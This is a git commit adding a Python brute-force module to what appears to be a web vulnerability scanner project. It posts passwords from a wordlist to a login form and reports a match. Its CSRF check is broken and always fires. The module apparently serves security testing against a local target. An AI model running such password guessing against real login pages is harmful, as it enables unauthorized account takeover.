011841a77e12a71d7f83dc150b825127cc9e54e3
Patrik Jankuv <jankuv.patri@outlook.com>
2023-01-22 22:56:09 +0100

    brute force

---
+++ htmlAPI/attack_modules/brute force/bruteForce.py
@@ -0,0 +1,40 @@
+import requests
+
+isVulnerable = False
+message = ""
+
+def crack(url, username, error_message, passwords):
+    count = 0
+    for password in passwords:
+        password = password.strip()
+        count = count + 1
+        data_dict = {"email": username,"password": password, "Log In":"submit"}
+        response = requests.post(url, data=data_dict)
+        print(response)
+        if error_message in str(response.content):
+            isVulnerable = True
+            pass
+        elif "CSRF" or "csrf" in str(response.content):
+            isVulnerable = False
+            message = "BruteForce not working on this website. CSRF Token Detecked."
+            return isVulnerable, message
+        else:
+            isVulnerable = True
+            message = "Password: " + password
+            return isVulnerable, message
+        
+    
+    message = "User password not in list of passwords"
+    return isVulnerable, message
+
+def bruteForceAttack(url, username, errorMessage):
+    url = url
+    username = username
+
+    try:
+        with open("passwords.txt", "r") as passwords:
+            return crack(url, username, errorMessage, passwords)
+    except:
+        print("Error")
+
+# print(bruteForceAttack("http://localhost:3000/#/login", "user@user.com", "Invalid email or password."))
